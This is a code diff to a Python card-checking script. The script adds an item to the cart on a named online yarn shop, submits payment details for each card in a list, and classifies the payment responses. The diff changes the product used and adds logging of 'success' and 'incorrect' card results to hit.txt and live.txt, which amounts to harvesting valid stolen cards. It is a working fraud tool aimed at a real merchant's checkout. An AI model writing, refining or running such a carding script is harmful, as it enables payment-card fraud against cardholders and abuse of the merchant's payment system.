@@ -58,10 +58,11 @@ def Tele(ccx):
         'x-requested-with': 'XMLHttpRequest',
     }
     params = {'wc-ajax': 'add_to_cart'}
+
     data = {
-        'success_message': '“1 x Wood Buttons Large 6cm 4 hole Dark Red Brown” has been added to your cart',
-        'product_sku': 'DB-B656908',
-        'product_id': '38286',
+        'success_message': '“1 x Wood Button Large 6cm Dark Coffee” has been added to your cart',
+        'product_sku': 'DB-B656902',
+        'product_id': '41799',
         'quantity': '1',
     }
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
@@ -89,7 +90,7 @@ def Tele(ccx):
         nonce = match.group(1)
         # print("nonce:", nonce)
     else:
-        print("nonce not found.")
+        print("out of stock -- nonce not found.")
     jar.update(response.cookies)
 
     #update order
@@ -248,12 +249,16 @@ def Tele(ccx):
 
     if "success" in response.text:
         print(Fore.GREEN + f"{ccx} {response.text}")
+        with open("hit.txt","a+")as f:
+            f.write(f"{ccx}{response.text}\n\n")
     elif "incorrect." in response.text:
         print(Fore.GREEN + f"{ccx} The card number is incorrect.")
+        with open("live.txt","a+")as f:
+            f.write(f"{ccx}{response.text}\n\n")
     elif "declined." in response.text:
         print(Fore.RED + f"{ccx} declined")
     elif "No such PaymentMethod: 'None'" in response.text:
-        print(Fore.RED  + f"{ccx} card detail incoorect 'None'")
+        print(Fore.RED  + f"{ccx} card detail incorrect 'None'")
     else:
         print(Fore.GREEN + f"{ccx}{response.text}")
         with open("q.txt","a+")as f:
